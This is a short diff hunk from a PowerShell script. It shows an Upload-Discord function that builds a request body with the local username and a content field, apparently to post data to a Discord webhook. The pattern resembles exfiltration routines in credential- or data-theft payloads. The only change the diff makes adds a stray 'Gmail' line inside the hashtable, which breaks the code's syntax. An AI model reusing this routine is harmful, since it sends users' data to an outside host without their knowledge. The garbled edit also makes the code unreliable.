@@ -13,6 +13,7 @@ function Upload-Discord {
     $hookurl = "$dc"
 
     $Body = @{
+    	Gmail
         'username' = $env:username
         'content' = $text
     }
